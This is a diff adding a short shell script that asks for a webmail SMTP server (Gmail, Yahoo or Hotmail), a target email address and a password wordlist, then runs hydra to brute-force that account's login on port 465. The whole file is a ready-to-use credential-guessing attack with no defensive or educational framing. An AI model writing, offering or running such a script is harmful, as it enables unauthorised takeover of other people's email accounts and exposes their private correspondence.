@@ -1,0 +1,10 @@
+#!/bin/sh
+echo NOTE: Make sure you have wordlists!
+echo Choose a SMTP service: Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com /:
+read -r smtp
+echo Enter Email Address:
+read -r email
+echo Provide Directory of Wordlist for Passwords:
+read -r wordlist
+
+hydra -S -l "${email}" -P "${wordlist}" -e ns -V -s 465 "${smtp}" smtp
